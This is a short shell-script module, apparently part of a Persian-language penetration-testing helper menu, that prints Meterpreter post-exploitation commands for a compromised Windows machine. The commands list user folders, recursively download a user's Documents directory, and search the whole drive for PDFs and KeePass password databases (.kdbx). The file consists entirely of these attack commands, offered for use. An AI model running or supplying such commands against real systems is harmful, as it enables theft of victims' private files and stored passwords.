DESC="پیمایش و کشیدن فایل"
REQ="session فعال"
RISK="MED"

termux(){ echo "# داخل meterpreter: ls / download"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
ls C:\\Users
cd C:\\Users\\<user>\\Documents
download -r .
# جستجوی فایل حساس:
search -f *.pdf -d C:\\
search -f *.kdbx -d C:\\
EOF
}
